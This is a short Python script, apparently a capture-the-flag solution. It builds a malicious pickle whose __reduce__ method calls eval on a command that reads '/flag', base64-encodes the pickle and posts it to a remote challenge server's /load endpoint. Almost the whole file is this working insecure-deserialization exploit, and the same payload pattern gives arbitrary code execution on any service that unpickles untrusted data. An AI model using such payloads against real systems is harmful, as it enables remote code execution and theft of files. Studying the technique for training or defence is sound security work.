import pickle
import os
import requests
import base64

class BadThing:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (eval, (self.cmd,))

serialized = pickle.dumps(BadThing('open("/flag").read()'))
print(serialized)
#pickle.loads(serialized)

res = requests.post('http://bamboofox.cs.nctu.edu.tw:15102/load', data={'data':base64.b64encode(serialized)})
print(res.text)
